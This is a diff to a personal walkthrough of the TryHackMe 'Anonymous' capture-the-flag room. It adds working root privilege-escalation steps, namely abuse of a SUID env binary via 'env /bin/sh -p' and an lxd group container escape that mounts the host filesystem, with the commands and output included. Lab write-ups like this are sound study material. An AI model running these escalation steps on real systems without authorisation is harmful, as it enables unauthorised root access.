@@ -1,4 +1,5 @@
 https://tryhackme.com/room/anonymous
+https://tryhackme.com/room/anonymous
 
 We start with an nmap scan:
 $ nmap -sV 10.10.165.195
@@ -145,3 +146,46 @@ quite find anything useful, but it's an area that I need to improve on. I'll rea
 through the walkthroughs to see if I can find more interesting ways of gaining root
 on this machine.
 
+If we look through /usr/bin for suid binaries:
+find /usr/bin/ -perm /u=s,g=s -exec ls -lh {} \; 2>/dev/null
+
+and cross reference them to binaries in the suid category on gtfobins, we find
+that we can use /usr/bin/env fir privilege escalation if the suid bit is set.
+And we are in luck:
+-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
+
+And by running "env /bin/sh -p"  we are able to get a root shell
+$ env /bin/sh -p
+# id
+uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+The -p option to /bin/sh makes it so sh doesn't reset the effective uid.
+
+According to one of the walkthroughs, the fact that namelessone is a member of
+the lxd group:
+$ groups
+namelessone adm cdrom sudo dip plugdev lxd
+
+is also supposed to be an avenue for privesc. Lets see if we can use that.
+
+On https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+we can find some good info. It essentially amounts to creating a lxc image that
+can read from the root fs on the host.
+
+After building the alpine image on the attackbox and transfering it to the victim:
+namelessone@anonymous:~/alpine: lxd init
+namelessone@anonymous:~/alpine$ lxc image import ./alpine-v3.*.tar.gz --alias myimage
+namelessone@anonymous:~/alpine$ lxc init myimage mycontainer -c security.privileged=true
+namelessone@anonymous:~/alpine$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+namelessone@anonymous:~/alpine$ lxc start privesc
+namelessone@anonymous:~/alpine$ lxc init myimage mycontainer -c security.privileged=true
+namelessone@anonymous:~/alpine$ lxc start mycontainer
+namelessone@anonymous:~/alpine$ lxc exec mycontainer /bin/sh
+~ # cat /mnt/root/root/root.txt
+********************************
+
+I'm stil curious about the SMB-share, if it was a possible attack vector, or just
+to throw people off.
+
+All in all, quite a fun room. It was fun with multiple privesc opportunities,
+especially the lxd one.
